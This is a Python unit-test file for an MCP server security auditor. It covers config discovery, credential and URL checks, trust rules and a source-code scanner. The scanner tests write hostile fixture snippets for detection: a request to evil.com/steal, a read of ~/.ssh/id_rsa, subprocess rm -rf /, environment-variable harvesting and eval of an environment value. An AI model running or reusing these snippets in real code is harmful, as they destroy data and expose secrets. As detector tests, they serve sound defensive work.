"""
Unit tests for MCP server security auditing.

Tests for MCPAuditor: server discovery, config audit,
deep source code scan, trust checking, and output formatting.

Issue #468
"""

import json
from unittest.mock import MagicMock, patch


from ai_guardian.mcp.audit import (
    MCPAuditor,
    MCPServerIDEConfig,
    MCPServerInfo,
    AuditFinding,
    AuditReport,
    ScanFinding,
    ScanReport,
)

# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


def _make_server(
    name="test-server",
    command="uvx",
    args=None,
    env_var_names=None,
    is_trusted=False,
    config_sources=None,
):
    sources = config_sources or ["~/.claude.json"]
    return MCPServerInfo(
        name=name,
        command=command,
        args=args or [],
        env_var_names=env_var_names or [],
        is_trusted=is_trusted,
        config_sources=sources,
        ide_configs=[
            MCPServerIDEConfig(
                ide=MCPAuditor.ide_label(s),
                config_path=s,
                command=command,
                args=args or [],
                env_var_names=env_var_names or [],
            )
            for s in sources
        ],
    )


# ---------------------------------------------------------------------------
# Server Discovery Tests
# ---------------------------------------------------------------------------


class TestDiscoverServers:
    """Tests for MCPAuditor.discover_servers()."""

    def test_discover_from_claude_json(self, tmp_path):
        """Discover MCP servers from ~/.claude.json."""
        config_file = tmp_path / ".claude.json"
        config_file.write_text(
            json.dumps(
                {
                    "mcpServers": {
                        "my-server": {
                            "command": "uvx",
                            "args": ["my-server-package"],
                            "env": {"API_KEY": "secret-value"},
                        }
                    }
                }
            )
        )

        auditor = MCPAuditor()
        with patch.object(
            auditor, "_get_config_paths", return_value=[str(config_file)]
        ):
            with patch.object(auditor, "_check_trust", return_value=False):
                servers = auditor.discover_servers()

        assert len(servers) == 1
        assert servers[0].name == "my-server"
        assert servers[0].command == "uvx"
        assert servers[0].args == ["my-server-package"]
        assert servers[0].env_var_names == ["API_KEY"]

    def test_discover_empty_config(self, tmp_path):
        """No servers found when config has no mcpServers."""
        config_file = tmp_path / "settings.json"
        config_file.write_text(json.dumps({"someOtherKey": {}}))

        auditor = MCPAuditor()
        with patch.object(
            auditor, "_get_config_paths", return_value=[str(config_file)]
        ):
            servers = auditor.discover_servers()

        assert len(servers) == 0

    def test_discover_no_config_files(self):
        """No servers found when config files don't exist."""
        auditor = MCPAuditor()
        with patch.object(
            auditor, "_get_config_paths", return_value=["/nonexistent/file.json"]
        ):
            servers = auditor.discover_servers()

        assert len(servers) == 0

    def test_discover_deduplication_with_multi_source(self, tmp_path):
        """Same server in multiple config files is deduplicated but accumulates sources."""
        config1 = tmp_path / "config1.json"
        config2 = tmp_path / "config2.json"

        server_def = {
            "mcpServers": {
                "shared-server": {"command": "npx", "args": ["shared-package"]}
            }
        }
        config1.write_text(json.dumps(server_def))
        config2.write_text(json.dumps(server_def))

        auditor = MCPAuditor()
        with patch.object(
            auditor, "_get_config_paths", return_value=[str(config1), str(config2)]
        ):
            with patch.object(auditor, "_check_trust", return_value=True):
                servers = auditor.discover_servers()

        assert len(servers) == 1
        assert servers[0].name == "shared-server"
        assert len(servers[0].config_sources) == 2
        assert str(config1) in servers[0].config_sources
        assert str(config2) in servers[0].config_sources

    def test_discover_env_var_names_only(self, tmp_path):
        """Env var values are NOT stored, only names."""
        config_file = tmp_path / "settings.json"
        config_file.write_text(
            json.dumps(
                {
                    "mcpServers": {
                        "secret-server": {
                            "command": "node",
                            "args": ["server.js"],
                            "env": {
                                "API_TOKEN": "super-secret-token-value",
                                "DB_PASSWORD": "another-secret",
                            },
                        }
                    }
                }
            )
        )

        auditor = MCPAuditor()
        with patch.object(
            auditor, "_get_config_paths", return_value=[str(config_file)]
        ):
            with patch.object(auditor, "_check_trust", return_value=False):
                servers = auditor.discover_servers()

        server = servers[0]
        assert "API_TOKEN" in server.env_var_names
        assert "DB_PASSWORD" in server.env_var_names
        # Values should NOT be stored anywhere
        assert "super-secret-token-value" not in str(server)
        assert "another-secret" not in str(server)

    def test_discover_multiple_servers(self, tmp_path):
        """Discover multiple servers from one config file."""
        config_file = tmp_path / "settings.json"
        config_file.write_text(
            json.dumps(
                {
                    "mcpServers": {
                        "server-a": {"command": "uvx", "args": ["pkg-a"]},
                        "server-b": {"command": "npx", "args": ["-y", "pkg-b"]},
                        "server-c": {"command": "python", "args": ["-m", "server_c"]},
                    }
                }
            )
        )

        auditor = MCPAuditor()
        with patch.object(
            auditor, "_get_config_paths", return_value=[str(config_file)]
        ):
            with patch.object(auditor, "_check_trust", return_value=False):
                servers = auditor.discover_servers()

        assert len(servers) == 3
        names = {s.name for s in servers}
        assert names == {"server-a", "server-b", "server-c"}

    def test_discover_malformed_json(self, tmp_path):
        """Gracefully handle malformed JSON config files."""
        config_file = tmp_path / "bad.json"
        config_file.write_text("{invalid json")

        auditor = MCPAuditor()
        with patch.object(
            auditor, "_get_config_paths", return_value=[str(config_file)]
        ):
            servers = auditor.discover_servers()

        assert len(servers) == 0


# ---------------------------------------------------------------------------
# Config Audit Tests
# ---------------------------------------------------------------------------


class TestAuditConfig:
    """Tests for MCPAuditor.audit_config()."""

    def test_credential_exposure_untrusted(self):
        """Untrusted server with credential env var triggers critical finding."""
        servers = [
            _make_server(
                name="risky-server",
                env_var_names=["API_TOKEN", "NORMAL_VAR"],
                is_trusted=False,
            )
        ]
        auditor = MCPAuditor()
        report = auditor.audit_config(servers)

        cred_findings = [
            f for f in report.findings if f.category == "credential_exposure"
        ]
        assert len(cred_findings) == 1
        assert cred_findings[0].severity == "critical"
        assert "API_TOKEN" in cred_findings[0].message

    def test_credential_exposure_trusted(self):
        """Trusted server with credential env var is OK."""
        servers = [
            _make_server(
                name="trusted-server",
                env_var_names=["API_TOKEN", "SECRET_KEY"],
                is_trusted=True,
            )
        ]
        auditor = MCPAuditor()
        report = auditor.audit_config(servers)

        cred_findings = [
            f for f in report.findings if f.category == "credential_exposure"
        ]
        assert len(cred_findings) == 0

    def test_credential_multiple_vars(self):
        """Multiple credential env vars on untrusted server produce multiple findings."""
        servers = [
            _make_server(
                name="multi-cred",
                env_var_names=["API_KEY", "AUTH_TOKEN", "DB_PASSWORD"],
                is_trusted=False,
            )
        ]
        auditor = MCPAuditor()
        report = auditor.audit_config(servers)

        cred_findings = [
            f for f in report.findings if f.category == "credential_exposure"
        ]
        assert len(cred_findings) == 3

    def test_npx_auto_install_untrusted(self):
        """Untrusted npx -y server triggers medium finding."""
        servers = [
            _make_server(
                name="npx-server",
                command="npx",
                args=["-y", "some-package"],
                is_trusted=False,
            )
        ]
        auditor = MCPAuditor()
        report = auditor.audit_config(servers)

        npx_findings = [f for f in report.findings if f.category == "npx_auto_install"]
        assert len(npx_findings) == 1
        assert npx_findings[0].severity == "medium"

    def test_npx_auto_install_trusted(self):
        """Trusted npx -y server does not trigger npx_auto_install finding."""
        servers = [
            _make_server(
                name="trusted-npx",
                command="npx",
                args=["-y", "trusted-package"],
                is_trusted=True,
            )
        ]
        auditor = MCPAuditor()
        report = auditor.audit_config(servers)

        npx_findings = [f for f in report.findings if f.category == "npx_auto_install"]
        assert len(npx_findings) == 0

    def test_unpinned_version_npx(self):
        """npx package without @version pin triggers medium finding."""
        servers = [
            _make_server(
                name="unpinned",
                command="npx",
                args=["some-package"],
            )
        ]
        auditor = MCPAuditor()
        report = auditor.audit_config(servers)

        pin_findings = [f for f in report.findings if f.category == "unpinned_version"]
        assert len(pin_findings) == 1
        assert pin_findings[0].severity == "medium"

    def test_pinned_version_ok(self):
        """npx package with @version is not flagged for unpinned_version."""
        servers = [
            _make_server(
                name="pinned",
                command="npx",
                args=["some-package@1.2.3"],
            )
        ]
        auditor = MCPAuditor()
        report = auditor.audit_config(servers)

        pin_findings = [f for f in report.findings if f.category == "unpinned_version"]
        assert len(pin_findings) == 0

    def test_unpinned_version_uvx(self):
        """uvx package without @version pin triggers medium finding."""
        servers = [
            _make_server(
                name="uvx-unpinned",
                command="uvx",
                args=["my-mcp-server"],
            )
        ]
        auditor = MCPAuditor()
        report = auditor.audit_config(servers)

        pin_findings = [f for f in report.findings if f.category == "unpinned_version"]
        assert len(pin_findings) == 1

    def test_suspicious_url_raw_ip(self):
        """Raw IP in args triggers high finding."""
        servers = [
            _make_server(
                name="ip-server",
                args=["--url", "http://192.168.1.100:3000"],
            )
        ]
        auditor = MCPAuditor()
        report = auditor.audit_config(servers)

        url_findings = [f for f in report.findings if f.category == "suspicious_url"]
        assert len(url_findings) == 1
        assert url_findings[0].severity == "high"

    def test_suspicious_url_ngrok(self):
        """ngrok URL in args triggers high finding."""
        servers = [
            _make_server(
                name="ngrok-server",
                args=["--endpoint", "https://abc123.ngrok.io"],
            )
        ]
        auditor = MCPAuditor()
        report = auditor.audit_config(servers)

        url_findings = [f for f in report.findings if f.category == "suspicious_url"]
        assert len(url_findings) == 1

    def test_suspicious_url_localhost(self):
        """localhost URL in args triggers high finding."""
        servers = [
            _make_server(
                name="local-server",
                args=["--host", "http://localhost:8080"],
            )
        ]
        auditor = MCPAuditor()
        report = auditor.audit_config(servers)

        url_findings = [f for f in report.findings if f.category == "suspicious_url"]
        assert len(url_findings) == 1

    def test_clean_server_no_findings(self):
        """Server with no issues produces no findings."""
        servers = [
            _make_server(
                name="clean-server",
                command="uvx",
                args=["clean-package@1.0.0"],
                env_var_names=["NORMAL_SETTING"],
                is_trusted=True,
            )
        ]
        auditor = MCPAuditor()
        report = auditor.audit_config(servers)

        assert len(report.findings) == 0

    def test_audit_report_has_timing(self):
        """Audit report includes scan time."""
        auditor = MCPAuditor()
        report = auditor.audit_config([])

        assert report.scan_time_ms >= 0

    @patch("ai_guardian.violations.logger.ViolationLogger", autospec=True)
    @patch(
        "ai_guardian.scanners.scan_result.generate_violation_id",
        return_value="test-vid",
    )
    def test_audit_logs_violation_for_untrusted_no_findings(
        self, _mock_vid, mock_vl_cls
    ):
        """Untrusted server with no findings logs info violation."""
        mock_vl = MagicMock()
        mock_vl_cls.return_value = mock_vl

        servers = [_make_server(name="plain-untrusted", is_trusted=False)]
        auditor = MCPAuditor()
        auditor.audit_config(servers)

        calls = mock_vl.log_violation.call_args_list
        assert len(calls) == 1
        assert calls[0].kwargs["severity"] == "info"
        assert calls[0].kwargs["context"]["source"] == "mcp_audit"

    @patch("ai_guardian.violations.logger.ViolationLogger", autospec=True)
    @patch(
        "ai_guardian.scanners.scan_result.generate_violation_id",
        return_value="test-vid",
    )
    def test_audit_logs_violation_for_credential_finding(self, _mock_vid, mock_vl_cls):
        """Credential exposure finding logs critical violation."""
        mock_vl = MagicMock()
        mock_vl_cls.return_value = mock_vl

        servers = [
            _make_server(
                name="cred-server",
                env_var_names=["API_KEY"],
                is_trusted=False,
            )
        ]
        auditor = MCPAuditor()
        auditor.audit_config(servers)

        calls = mock_vl.log_violation.call_args_list
        severities = [c.kwargs["severity"] for c in calls]
        assert "critical" in severities

    @patch("ai_guardian.violations.logger.ViolationLogger", autospec=True)
    @patch(
        "ai_guardian.scanners.scan_result.generate_violation_id",
        return_value="test-vid",
    )
    def test_audit_no_violation_for_trusted(self, _mock_vid, mock_vl_cls):
        """Trusted server does not log any violation."""
        mock_vl = MagicMock()
        mock_vl_cls.return_value = mock_vl

        servers = [_make_server(name="trusted-srv", is_trusted=True)]
        auditor = MCPAuditor()
        auditor.audit_config(servers)

        mock_vl.log_violation.assert_not_called()


# ---------------------------------------------------------------------------
# Deep Source Scan Tests
# ---------------------------------------------------------------------------


class TestScanSource:
    """Tests for MCPAuditor.scan_source()."""

    def test_scan_outbound_http(self, tmp_path):
        """Detect outbound HTTP calls in source code."""
        source_dir = tmp_path / "server_src"
        source_dir.mkdir()
        (source_dir / "main.py").write_text(
            "import requests\ndata = requests.get('http://evil.com/steal')\n"
        )

        server = _make_server(name="http-server")
        auditor = MCPAuditor()
        with patch.object(
            auditor, "_resolve_source_path", return_value=str(source_dir)
        ):
            report = auditor.scan_source(server)

        assert report is not None
        http_findings = [f for f in report.findings if f.category == "outbound_http"]
        assert len(http_findings) >= 1

    def test_scan_sensitive_file_read(self, tmp_path):
        """Detect reads of sensitive file paths."""
        source_dir = tmp_path / "server_src"
        source_dir.mkdir()
        (source_dir / "loader.py").write_text(
            "with open('~/.ssh/id_rsa') as f:\n    key = f.read()\n"
        )

        server = _make_server(name="ssh-reader")
        auditor = MCPAuditor()
        with patch.object(
            auditor, "_resolve_source_path", return_value=str(source_dir)
        ):
            report = auditor.scan_source(server)

        assert report is not None
        file_findings = [
            f for f in report.findings if f.category == "sensitive_file_read"
        ]
        assert len(file_findings) >= 1
        assert file_findings[0].severity == "high"

    def test_scan_subprocess_exec(self, tmp_path):
        """Detect subprocess and exec calls."""
        source_dir = tmp_path / "server_src"
        source_dir.mkdir()
        (source_dir / "runner.py").write_text(
            "import subprocess\nsubprocess.run(['rm', '-rf', '/'])\n"
        )

        server = _make_server(name="exec-server")
        auditor = MCPAuditor()
        with patch.object(
            auditor, "_resolve_source_path", return_value=str(source_dir)
        ):
            report = auditor.scan_source(server)

        assert report is not None
        exec_findings = [f for f in report.findings if f.category == "subprocess_exec"]
        assert len(exec_findings) >= 1
        assert exec_findings[0].severity == "high"

    def test_scan_base64_encoding(self, tmp_path):
        """Detect base64 encoding patterns."""
        source_dir = tmp_path / "server_src"
        source_dir.mkdir()
        (source_dir / "exfil.py").write_text(
            "import base64\nencoded = base64.b64encode(sensitive_data)\n"
        )

        server = _make_server(name="b64-server")
        auditor = MCPAuditor()
        with patch.object(
            auditor, "_resolve_source_path", return_value=str(source_dir)
        ):
            report = auditor.scan_source(server)

        assert report is not None
        b64_findings = [f for f in report.findings if f.category == "base64_exfil"]
        assert len(b64_findings) >= 1

    def test_scan_env_harvesting(self, tmp_path):
        """Detect bulk environment variable access."""
        source_dir = tmp_path / "server_src"
        source_dir.mkdir()
        (source_dir / "harvest.py").write_text(
            "import os\nall_env = dict(os.environ)\n"
        )

        server = _make_server(name="env-harvester")
        auditor = MCPAuditor()
        with patch.object(
            auditor, "_resolve_source_path", return_value=str(source_dir)
        ):
            report = auditor.scan_source(server)

        assert report is not None
        env_findings = [f for f in report.findings if f.category == "env_harvesting"]
        assert len(env_findings) >= 1
        assert env_findings[0].severity == "high"

    def test_scan_no_source_returns_none(self):
        """Returns None when source path cannot be resolved."""
        server = _make_server(name="no-source", command="nonexistent-binary")
        auditor = MCPAuditor()
        with patch.object(auditor, "_resolve_source_path", return_value=None):
            report = auditor.scan_source(server)

        assert report is None

    def test_scan_clean_source(self, tmp_path):
        """Clean source code produces no findings."""
        source_dir = tmp_path / "server_src"
        source_dir.mkdir()
        (source_dir / "main.py").write_text("def hello():\n    return 'world'\n")

        server = _make_server(name="clean-server")
        auditor = MCPAuditor()
        with patch.object(
            auditor, "_resolve_source_path", return_value=str(source_dir)
        ):
            report = auditor.scan_source(server)

        assert report is not None
        assert len(report.findings) == 0
        assert report.files_scanned == 1

    def test_scan_skips_node_modules(self, tmp_path):
        """Source scan skips node_modules directory."""
        source_dir = tmp_path / "server_src"
        source_dir.mkdir()
        nm = source_dir / "node_modules" / "evil"
        nm.mkdir(parents=True)
        (nm / "bad.js").write_text("eval(process.env.MALICIOUS)")
        (source_dir / "clean.js").write_text("const x = 1;\n")

        server = _make_server(name="skip-nm")
        auditor = MCPAuditor()
        with patch.object(
            auditor, "_resolve_source_path", return_value=str(source_dir)
        ):
            report = auditor.scan_source(server)

        assert report is not None
        assert report.files_scanned == 1
        assert len(report.findings) == 0

    def test_scan_report_has_timing(self, tmp_path):
        """Scan report includes timing and file count."""
        source_dir = tmp_path / "server_src"
        source_dir.mkdir()
        (source_dir / "a.py").write_text("x = 1\n")
        (source_dir / "b.py").write_text("y = 2\n")

        server = _make_server(name="timing")
        auditor = MCPAuditor()
        with patch.object(
            auditor, "_resolve_source_path", return_value=str(source_dir)
        ):
            report = auditor.scan_source(server)

        assert report.files_scanned == 2
        assert report.scan_time_ms >= 0


# ---------------------------------------------------------------------------
# Trust Checking Tests
# ---------------------------------------------------------------------------


class TestTrustChecking:
    """Tests for MCPAuditor._check_trust().

    _check_trust uses _find_permission_rules() + pattern matching
    instead of check_tool_allowed() to avoid logging phantom violations (#1977).
    """

    @patch("ai_guardian.tools.policy.ToolPolicyChecker", autospec=True)
    def test_trusted_server_new_format(self, mock_checker_cls):
        """Server with mode=allow rule is trusted (new format)."""
        mock_instance = MagicMock()
        mock_instance._find_permission_rules.return_value = [
            {"matcher": "mcp__*", "mode": "allow", "patterns": ["*"]}
        ]
        mock_instance._extract_pattern_string.return_value = "*"
        mock_checker_cls.return_value = mock_instance

        auditor = MCPAuditor()
        assert auditor._check_trust("allowed-server") is True

    @patch("ai_guardian.tools.policy.ToolPolicyChecker", autospec=True)
    def test_trusted_server_legacy_format(self, mock_checker_cls):
        """Server with legacy allow list is trusted."""
        mock_instance = MagicMock()
        mock_instance._find_permission_rules.return_value = [
            {"matcher": "mcp__*", "allow": ["*"]}
        ]
        mock_instance._extract_pattern_string.return_value = "*"
        mock_checker_cls.return_value = mock_instance

        auditor = MCPAuditor()
        assert auditor._check_trust("allowed-server") is True

    @patch("ai_guardian.tools.policy.ToolPolicyChecker", autospec=True)
    def test_untrusted_server_no_rules(self, mock_checker_cls):
        """Server with no permission rules is untrusted."""
        mock_instance = MagicMock()
        mock_instance._find_permission_rules.return_value = []
        mock_checker_cls.return_value = mock_instance

        auditor = MCPAuditor()
        assert auditor._check_trust("unknown-server") is False

    @patch("ai_guardian.tools.policy.ToolPolicyChecker", autospec=True)
    def test_untrusted_server_deny_only(self, mock_checker_cls):
        """Server with only deny rules is untrusted."""
        mock_instance = MagicMock()
        mock_instance._find_permission_rules.return_value = [
            {"matcher": "mcp__*", "mode": "deny", "patterns": ["*"]}
        ]
        mock_checker_cls.return_value = mock_instance

        auditor = MCPAuditor()
        assert auditor._check_trust("denied-server") is False

    @patch("ai_guardian.tools.policy.ToolPolicyChecker", autospec=True)
    def test_trust_no_violation_logged(self, mock_checker_cls):
        """Trust check does NOT call check_tool_allowed (no violation logging)."""
        mock_instance = MagicMock()
        mock_instance._find_permission_rules.return_value = []
        mock_checker_cls.return_value = mock_instance

        auditor = MCPAuditor()
        auditor._check_trust("any-server")

        mock_instance.check_tool_allowed.assert_not_called()

    def test_trust_check_handles_errors(self):
        """Trust check returns False on errors."""
        auditor = MCPAuditor()
        with patch(
            "ai_guardian.tools.policy.ToolPolicyChecker", side_effect=Exception("boom")
        ):
            assert auditor._check_trust("error-server") is False


# ---------------------------------------------------------------------------
# Output Formatting Tests
# ---------------------------------------------------------------------------


class TestOutputFormatting:
    """Tests for output methods."""

    def test_server_list_json_structure(self):
        """JSON output has correct structure with config_sources, ide_sources, and ide_configs."""
        servers = [
            _make_server(name="s1", is_trusted=True, config_sources=["~/.claude.json"]),
            _make_server(
                name="s2", is_trusted=False, config_sources=["~/.cursor/mcp.json"]
            ),
        ]
        auditor = MCPAuditor()
        result = json.loads(auditor.get_server_list_json(servers))

        assert isinstance(result, list)
        assert len(result) == 2
        assert result[0]["name"] == "s1"
        assert result[0]["is_trusted"] is True
        assert result[0]["config_sources"] == ["~/.claude.json"]
        assert result[0]["ide_sources"] == ["Claude"]
        assert len(result[0]["ide_configs"]) == 1
        assert result[0]["ide_configs"][0]["ide"] == "Claude"
        assert result[1]["name"] == "s2"
        assert result[1]["is_trusted"] is False
        assert result[1]["config_sources"] == ["~/.cursor/mcp.json"]
        assert result[1]["ide_sources"] == ["Cursor"]
        assert result[1]["ide_configs"][0]["ide"] == "Cursor"

    def test_audit_report_json_structure(self):
        """Audit report JSON has correct structure."""
        servers = [_make_server(name="s1", is_trusted=True)]
        report = AuditReport(
            servers=servers,
            findings=[
                AuditFinding(
                    server_name="s1",
                    severity="critical",
                    category="credential_exposure",
                    message="test msg",
                )
            ],
            scan_time_ms=5,
        )

        auditor = MCPAuditor()
        result = json.loads(auditor.get_audit_report_json(report))

        assert result["servers"] == 1
        assert result["trusted"] == 1
        assert result["untrusted"] == 0
        assert len(result["findings"]) == 1
        assert result["findings"][0]["severity"] == "critical"

    def test_scan_report_json_structure(self):
        """Scan report JSON has correct structure."""
        report = ScanReport(
            server_name="test",
            source_path="/tmp/test",
            findings=[
                ScanFinding(
                    server_name="test",
                    severity="high",
                    category="subprocess_exec",
                    file_path="main.py",
                    line_number=5,
                    message="test",
                    code_snippet="subprocess.run(['cmd'])",
                )
            ],
            files_scanned=3,
            scan_time_ms=100,
        )

        auditor = MCPAuditor()
        result = json.loads(auditor.get_scan_report_json(report))

        assert result["server_name"] == "test"
        assert result["files_scanned"] == 3
        assert len(result["findings"]) == 1
        assert result["findings"][0]["line_number"] == 5

    def test_print_server_list_no_servers(self, capsys):
        """Print message when no servers found."""
        auditor = MCPAuditor()
        auditor.print_server_list([])
        output = capsys.readouterr().out
        assert "No MCP servers found" in output

    def test_print_server_list_shows_servers(self, capsys):
        """Print server list with trust status and IDE sources."""
        servers = [
            _make_server(
                name="trusted-srv",
                is_trusted=True,
                config_sources=["~/.claude.json"],
            ),
            _make_server(
                name="untrusted-srv",
                is_trusted=False,
                config_sources=["~/.cursor/mcp.json"],
            ),
        ]
        auditor = MCPAuditor()
        auditor.print_server_list(servers)
        output = capsys.readouterr().out
        assert "trusted-srv" in output
        assert "untrusted-srv" in output
        assert "Trusted" in output
        assert "Untrusted" in output
        assert "Claude" in output
        assert "Cursor" in output
        assert "IDE" in output

    def test_print_audit_report_clean(self, capsys):
        """Print message for clean audit."""
        report = AuditReport(servers=[], findings=[], scan_time_ms=1)
        auditor = MCPAuditor()
        auditor.print_audit_report(report)
        output = capsys.readouterr().out
        assert "No issues found" in output

    def test_print_server_list_verbose_shows_sources(self, capsys):
        """Verbose output shows config sources with IDE labels."""
        servers = [
            _make_server(
                name="multi-src",
                config_sources=["~/.claude.json", "~/.cursor/mcp.json"],
            ),
        ]
        auditor = MCPAuditor()
        auditor.print_server_list(servers, verbose=True)
        output = capsys.readouterr().out
        assert "~/.claude.json" in output
        assert "~/.cursor/mcp.json" in output
        assert "Claude" in output
        assert "Cursor" in output


# ---------------------------------------------------------------------------
# IDE Label Tests
# ---------------------------------------------------------------------------


class TestIDELabel:
    """Tests for MCPAuditor.ide_label()."""

    def test_claude_json(self):
        assert MCPAuditor.ide_label("~/.claude.json") == "Claude"

    def test_claude_settings(self):
        assert MCPAuditor.ide_label("~/.claude/settings.json") == "Claude"

    def test_claude_config_dir(self):
        assert MCPAuditor.ide_label("/custom/.claude/settings.json") == "Claude"

    def test_cursor(self):
        assert MCPAuditor.ide_label("~/.cursor/mcp.json") == "Cursor"

    def test_windsurf(self):
        assert MCPAuditor.ide_label("~/.windsurf/mcp.json") == "Windsurf"

    def test_codex(self):
        assert MCPAuditor.ide_label("codex.json") == "Codex"

    def test_unknown(self):
        assert MCPAuditor.ide_label("/some/other/file.json") == "Unknown"

    def test_project_local_claude(self):
        assert MCPAuditor.ide_label("/project/.claude/settings.json") == "Claude"

    def test_cline(self):
        assert MCPAuditor.ide_label("~/.cline/mcp_settings.json") == "Cline"

    def test_gemini(self):
        assert MCPAuditor.ide_label("~/.gemini/settings.json") == "Gemini CLI"

    def test_augment(self):
        assert MCPAuditor.ide_label("~/.augment/settings.json") == "Augment"

    def test_kiro(self):
        assert MCPAuditor.ide_label("~/.kiro/settings.json") == "Kiro"

    def test_junie(self):
        assert MCPAuditor.ide_label("~/.junie/mcp.json") == "Junie"

    def test_aiderdesk(self):
        assert MCPAuditor.ide_label("~/.aider-desk/settings.json") == "AiderDesk"

    def test_openclaw(self):
        assert MCPAuditor.ide_label("~/.openclaw/settings.json") == "OpenClaw"

    def test_opencode(self):
        assert MCPAuditor.ide_label("~/.config/opencode/opencode.jsonc") == "OpenCode"

    def test_crush(self):
        assert MCPAuditor.ide_label(".crush.json") == "Crush"

    def test_vscode(self):
        assert MCPAuditor.ide_label(".vscode/mcp.json") == "VS Code"
